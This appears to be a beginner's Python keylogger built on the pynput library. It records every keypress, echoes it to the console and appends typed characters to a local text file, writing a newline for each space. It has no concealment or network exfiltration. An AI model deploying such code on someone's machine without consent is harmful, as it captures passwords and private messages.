## every time the users hits space we want to create a new line
import pynput
from pynput.keyboard import Key, Listener
count = 0
keys = []
filename = "testo.txt"


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(filename , "a") as file:
        for key in keys:
            k = str(key).replace("'" , "")
            if k.find("space") > 0: ## if k is a space then add a newline
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        write_file(keys)
        return False

with Listener(on_press = on_press , on_release = on_release) as listener:
##functions that are going to be called when a key is pressed
    listener.join()
